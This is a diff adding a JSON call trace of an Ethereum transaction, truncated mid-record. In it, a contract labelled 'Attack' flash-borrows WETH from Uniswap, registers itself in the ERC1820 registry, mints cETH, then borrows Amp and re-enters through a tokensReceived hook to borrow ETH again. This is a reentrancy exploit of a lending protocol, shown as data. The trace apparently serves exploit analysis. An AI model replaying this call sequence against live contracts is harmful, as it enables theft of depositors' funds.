@@ -1,0 +1,2142 @@
+[
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24",
+        "op": "CALL",
+        "value": 0,
+        "function": "setInterfaceImplementer(address,bytes32,address)",
+        "inputs": {
+            "_addr": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "_interfaceHash": "0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a",
+            "_implementer": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "fromName": "Attack",
+        "toName": "ERC1820Registry"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E",
+        "op": "CALL",
+        "value": 0,
+        "function": "swap(uint256,uint256,address,bytes)",
+        "inputs": {
+            "amount0Out": 0,
+            "amount1Out": 500000000000000000000,
+            "to": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "data": "0x00"
+        },
+        "fromName": "Attack",
+        "toName": "UniswapV2Pair"
+    },
+    {
+        "from": "0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E",
+        "to": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+        "op": "CALL",
+        "value": 0,
+        "function": "transfer(address,uint256)",
+        "inputs": {
+            "dst": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "wad": 500000000000000000000
+        },
+        "fromName": "UniswapV2Pair",
+        "toName": "WETH9"
+    },
+    {
+        "from": "0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E",
+        "to": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "op": "CALL",
+        "value": 0,
+        "function": "uniswapV2Call(address,uint256,uint256,bytes)",
+        "inputs": {
+            "varg0": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "varg1": 0,
+            "varg2": 500000000000000000000,
+            "varg3": "0x00"
+        },
+        "fromName": "UniswapV2Pair",
+        "toName": "Attack"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+        "op": "CALL",
+        "value": 0,
+        "function": "approve(address,uint256)",
+        "inputs": {
+            "guy": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "wad": 115792089237316195423570985008687907853269984665640564039457584007913129639935
+        },
+        "fromName": "Attack",
+        "toName": "WETH9"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+        "op": "CALL",
+        "value": 0,
+        "function": "withdraw(uint256)",
+        "inputs": {
+            "wad": 500000000000000000000
+        },
+        "fromName": "Attack",
+        "toName": "WETH9"
+    },
+    {
+        "from": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+        "to": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "op": "CALL",
+        "value": 500000000000000000000,
+        "calldata": "0x",
+        "fromName": "WETH9",
+        "toName": "Attack"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "op": "CALL",
+        "value": 500000000000000000000,
+        "function": "mint()",
+        "inputs": {},
+        "fromName": "Attack",
+        "toName": "CEther"
+    },
+    {
+        "from": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "to": "0x812C0b2a2A0A74f6f6ed620Fbd2B67Fec7DB2190",
+        "op": "STATICCALL",
+        "function": "getBorrowRate(uint256,uint256,uint256)",
+        "inputs": {
+            "cash": 1824106833908118122752,
+            "borrows": 4625435318087959774131,
+            "reserves": 3462470277093771192
+        },
+        "return_value": [
+            51195625523
+        ],
+        "fromName": "CEther",
+        "toName": "TripleSlopeRateModel"
+    },
+    {
+        "from": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "to": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "op": "CALL",
+        "value": 0,
+        "function": "mintAllowed(address,address,uint256)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "minter": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "mintAmount": 500000000000000000000
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "CEther",
+        "toName": "Unitroller"
+    },
+    {
+        "from": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "to": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "op": "DELEGATECALL",
+        "function": "mintAllowed(address,address,uint256)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "minter": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "mintAmount": 500000000000000000000
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "Unitroller",
+        "toName": "Comptroller"
+    },
+    {
+        "from": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "to": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "op": "CALL",
+        "value": 0,
+        "function": "mintVerify(address,address,uint256,uint256)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "minter": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "actualMintAmount": 500000000000000000000,
+            "mintTokens": 2417223480577
+        },
+        "return_value": null,
+        "fromName": "CEther",
+        "toName": "Unitroller"
+    },
+    {
+        "from": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "to": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "op": "DELEGATECALL",
+        "function": "mintVerify(address,address,uint256,uint256)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "minter": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "actualMintAmount": 500000000000000000000,
+            "mintTokens": 2417223480577
+        },
+        "fromName": "Unitroller",
+        "toName": "Comptroller"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "op": "CALL",
+        "value": 0,
+        "function": "enterMarkets(address[])",
+        "inputs": {
+            "cTokens": [
+                "0xD06527D5e56A3495252A528C4987003b712860eE"
+            ]
+        },
+        "return_value": [
+            [
+                0
+            ]
+        ],
+        "fromName": "Attack",
+        "toName": "Unitroller"
+    },
+    {
+        "from": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "to": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "op": "DELEGATECALL",
+        "function": "enterMarkets(address[])",
+        "inputs": {
+            "cTokens": [
+                "0xD06527D5e56A3495252A528C4987003b712860eE"
+            ]
+        },
+        "return_value": [
+            [
+                0
+            ]
+        ],
+        "fromName": "Unitroller",
+        "toName": "Comptroller"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "CALL",
+        "value": 0,
+        "function": "borrow(uint256)",
+        "inputs": {
+            "borrowAmount": 19480000000000000000000000
+        },
+        "fromName": "Attack",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "to": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "op": "DELEGATECALL",
+        "function": "borrow(uint256)",
+        "inputs": {
+            "borrowAmount": 19480000000000000000000000
+        },
+        "fromName": "CErc20Delegator",
+        "toName": "CCollateralCapErc20Delegate"
+    },
+    {
+        "from": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "to": "0xbadaC56c9aca307079e8B8FC699987AAc89813ee",
+        "op": "STATICCALL",
+        "function": "getBorrowRate(uint256,uint256,uint256)",
+        "inputs": {
+            "cash": 33663858581302237334110531,
+            "borrows": 470166088159676190211552469,
+            "reserves": 207252914123973988114735
+        },
+        "return_value": [
+            384246845119
+        ],
+        "fromName": "CCollateralCapErc20Delegate",
+        "toName": "TripleSlopeRateModel"
+    },
+    {
+        "from": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "to": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "op": "CALL",
+        "value": 0,
+        "function": "borrowAllowed(address,address,uint256)",
+        "inputs": {
+            "cToken": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "borrowAmount": 19480000000000000000000000
+        },
+        "fromName": "CCollateralCapErc20Delegate",
+        "toName": "Unitroller"
+    },
+    {
+        "from": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "to": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "op": "DELEGATECALL",
+        "function": "borrowAllowed(address,address,uint256)",
+        "inputs": {
+            "cToken": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "borrowAmount": 19480000000000000000000000
+        },
+        "fromName": "Unitroller",
+        "toName": "Comptroller"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "CALL",
+        "value": 0,
+        "function": "registerCollateral(address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "Comptroller",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "to": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "op": "DELEGATECALL",
+        "function": "registerCollateral(address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "CErc20Delegator",
+        "toName": "CCollateralCapErc20Delegate"
+    },
+    {
+        "from": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "to": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "op": "STATICCALL",
+        "function": "checkMembership(address,address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "cToken": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6"
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "CCollateralCapErc20Delegate",
+        "toName": "Unitroller"
+    },
+    {
+        "from": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "to": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "op": "DELEGATECALL",
+        "function": "checkMembership(address,address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "cToken": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6"
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "Unitroller",
+        "toName": "Comptroller"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "op": "STATICCALL",
+        "function": "getUnderlyingPrice(address)",
+        "inputs": {
+            "cToken": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6"
+        },
+        "return_value": [
+            17832542795200
+        ],
+        "fromName": "Comptroller",
+        "toName": "PriceOracleProxy"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "STATICCALL",
+        "function": "underlying()",
+        "inputs": {},
+        "return_value": [
+            "0xfF20817765cB7f73d4bde2e66e067E58D11095C2"
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "latestRoundData(address,address)",
+        "inputs": {
+            "base": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+            "quote": "0x0000000000000000000000000000000000000348"
+        },
+        "return_value": [
+            18446744073709559184,
+            5648000,
+            1630302179,
+            1630302179,
+            18446744073709559184
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6",
+        "op": "STATICCALL",
+        "function": "latestRoundData()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "decimals(address,address)",
+        "inputs": {
+            "base": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+            "quote": "0x0000000000000000000000000000000000000348"
+        },
+        "return_value": [
+            8
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "latestRoundData(address,address)",
+        "inputs": {
+            "base": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+            "quote": "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"
+        },
+        "return_value": [
+            18446744073709555151,
+            315731990000000,
+            1630295166,
+            1630295166,
+            18446744073709555151
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E",
+        "op": "STATICCALL",
+        "function": "latestRoundData()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "decimals(address,address)",
+        "inputs": {
+            "base": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+            "quote": "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"
+        },
+        "return_value": [
+            18
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "return_value": [
+            6
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FiatTokenProxy"
+    },
+    {
+        "from": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+        "to": "0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF",
+        "op": "DELEGATECALL",
+        "function": "decimals()",
+        "inputs": {},
+        "return_value": [
+            6
+        ],
+        "fromName": "FiatTokenProxy",
+        "toName": "FiatTokenV2_1"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "return_value": [
+            18
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "Amp"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "op": "STATICCALL",
+        "function": "getAccountSnapshot(address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "return_value": [
+            0,
+            2417223480577,
+            0,
+            206848892548606231814997144
+        ],
+        "fromName": "Comptroller",
+        "toName": "CEther"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "op": "STATICCALL",
+        "function": "getUnderlyingPrice(address)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE"
+        },
+        "return_value": [
+            1000000000000000000
+        ],
+        "fromName": "Comptroller",
+        "toName": "PriceOracleProxy"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "STATICCALL",
+        "function": "getAccountSnapshot(address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "fromName": "Comptroller",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "STATICCALL",
+        "calldata": "0x0933c1ed00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000024c37f68e200000000000000000000000038c40427efbaae566407e4cde2a91947df0bd22b00000000000000000000000000000000000000000000000000000000",
+        "returndata": "0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a5996d46fe35611c86ca9e",
+        "return_value": [
+            0,
+            0,
+            0,
+            200197298118981821831498398
+        ],
+        "fromName": "CErc20Delegator",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "to": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "op": "DELEGATECALL",
+        "function": "getAccountSnapshot(address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "return_value": [
+            0,
+            0,
+            0,
+            200197298118981821831498398
+        ],
+        "fromName": "CErc20Delegator",
+        "toName": "CCollateralCapErc20Delegate"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "op": "STATICCALL",
+        "function": "getUnderlyingPrice(address)",
+        "inputs": {
+            "cToken": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6"
+        },
+        "return_value": [
+            17832542795200
+        ],
+        "fromName": "Comptroller",
+        "toName": "PriceOracleProxy"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "STATICCALL",
+        "function": "underlying()",
+        "inputs": {},
+        "return_value": [
+            "0xfF20817765cB7f73d4bde2e66e067E58D11095C2"
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "latestRoundData(address,address)",
+        "inputs": {
+            "base": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+            "quote": "0x0000000000000000000000000000000000000348"
+        },
+        "return_value": [
+            18446744073709559184,
+            5648000,
+            1630302179,
+            1630302179,
+            18446744073709559184
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6",
+        "op": "STATICCALL",
+        "function": "latestRoundData()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "decimals(address,address)",
+        "inputs": {
+            "base": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+            "quote": "0x0000000000000000000000000000000000000348"
+        },
+        "return_value": [
+            8
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "latestRoundData(address,address)",
+        "inputs": {
+            "base": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+            "quote": "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"
+        },
+        "return_value": [
+            18446744073709555151,
+            315731990000000,
+            1630295166,
+            1630295166,
+            18446744073709555151
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E",
+        "op": "STATICCALL",
+        "function": "latestRoundData()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "decimals(address,address)",
+        "inputs": {
+            "base": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+            "quote": "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"
+        },
+        "return_value": [
+            18
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "return_value": [
+            6
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FiatTokenProxy"
+    },
+    {
+        "from": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+        "to": "0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF",
+        "op": "DELEGATECALL",
+        "function": "decimals()",
+        "inputs": {},
+        "return_value": [
+            6
+        ],
+        "fromName": "FiatTokenProxy",
+        "toName": "FiatTokenV2_1"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "return_value": [
+            18
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "Amp"
+    },
+    {
+        "from": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "to": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "op": "CALL",
+        "value": 0,
+        "function": "transfer(address,uint256)",
+        "inputs": {
+            "_to": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "_value": 19480000000000000000000000
+        },
+        "return_value": [
+            true
+        ],
+        "fromName": "CCollateralCapErc20Delegate",
+        "toName": "Amp"
+    },
+    {
+        "from": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "to": "0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24",
+        "op": "STATICCALL",
+        "function": "getInterfaceImplementer(address,bytes32)",
+        "inputs": {
+            "_addr": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "_interfaceHash": "0x60881b58a7ad1ebd3bc0e92b8277996363a67ded0f43bd95d11c320bab72b5a4"
+        },
+        "return_value": [
+            "0x0000000000000000000000000000000000000000"
+        ],
+        "fromName": "Amp",
+        "toName": "ERC1820Registry"
+    },
+    {
+        "from": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "to": "0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24",
+        "op": "STATICCALL",
+        "function": "getInterfaceImplementer(address,bytes32)",
+        "inputs": {
+            "_addr": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "_interfaceHash": "0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a"
+        },
+        "return_value": [
+            "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        ],
+        "fromName": "Amp",
+        "toName": "ERC1820Registry"
+    },
+    {
+        "from": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "to": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "op": "CALL",
+        "value": 0,
+        "function": "tokensReceived(bytes4,bytes32,address,address,address,uint256,bytes,bytes)",
+        "inputs": {
+            "varg0": "0xa9059cbb",
+            "varg1": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "varg2": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "varg3": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "varg4": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "varg5": 19480000000000000000000000,
+            "varg6": "0x",
+            "varg7": "0x"
+        },
+        "fromName": "Amp",
+        "toName": "Attack"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "op": "CALL",
+        "value": 0,
+        "function": "borrow(uint256)",
+        "inputs": {
+            "borrowAmount": 355000000000000000000
+        },
+        "fromName": "Attack",
+        "toName": "CEther"
+    },
+    {
+        "from": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "to": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "op": "CALL",
+        "value": 0,
+        "function": "borrowAllowed(address,address,uint256)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "borrowAmount": 355000000000000000000
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "CEther",
+        "toName": "Unitroller"
+    },
+    {
+        "from": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "to": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "op": "DELEGATECALL",
+        "function": "borrowAllowed(address,address,uint256)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "borrowAmount": 355000000000000000000
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "Unitroller",
+        "toName": "Comptroller"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "op": "STATICCALL",
+        "function": "getUnderlyingPrice(address)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE"
+        },
+        "return_value": [
+            1000000000000000000
+        ],
+        "fromName": "Comptroller",
+        "toName": "PriceOracleProxy"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "op": "STATICCALL",
+        "function": "getAccountSnapshot(address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "return_value": [
+            0
